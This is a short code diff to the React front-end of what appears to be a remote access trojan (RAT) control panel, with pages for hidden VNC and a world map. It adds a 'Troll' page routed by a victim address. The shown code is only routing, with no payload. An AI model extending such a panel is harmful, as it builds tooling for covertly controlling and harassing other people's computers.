@@ -20,6 +20,7 @@ import {
 } from "./rat/RATCommands";
 import { HVNC } from "./pages/HVNC";
 import { WorldMap } from "./pages/WorldMap";
+import { Troll } from "./pages/Troll";
 
 export const App: React.FC = () => {
   return (
@@ -102,6 +103,14 @@ export const App: React.FC = () => {
               }}
             >
               <HVNC />
+            </WindowWrapper>
+          }
+        />
+        <Route
+          path="/troll/:addr"
+          element={
+            <WindowWrapper feature_cleanup={() => {}}>
+              <Troll />
             </WindowWrapper>
           }
         />
